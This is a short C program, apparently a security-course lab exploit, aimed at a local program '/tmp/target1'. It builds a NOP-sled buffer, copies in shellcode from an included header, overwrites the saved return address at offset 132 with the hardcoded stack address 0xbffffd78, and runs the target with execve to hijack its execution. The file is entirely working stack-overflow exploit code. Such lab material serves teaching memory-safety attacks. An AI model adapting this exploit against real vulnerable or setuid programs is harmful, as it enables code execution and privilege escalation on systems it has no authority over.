#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];

  args[0] = TARGET; 
  args[1] = malloc(137);
  memset(args[1], 0x90, 136);
  args[1][136] = '\0';
  memcpy(args[1], shellcode, strlen(shellcode));
  *(unsigned int *)(args[1] + 132) = 0xbffffd78;
  args[2] = NULL;

  execve(TARGET, args, NULL);

  return 0;
}
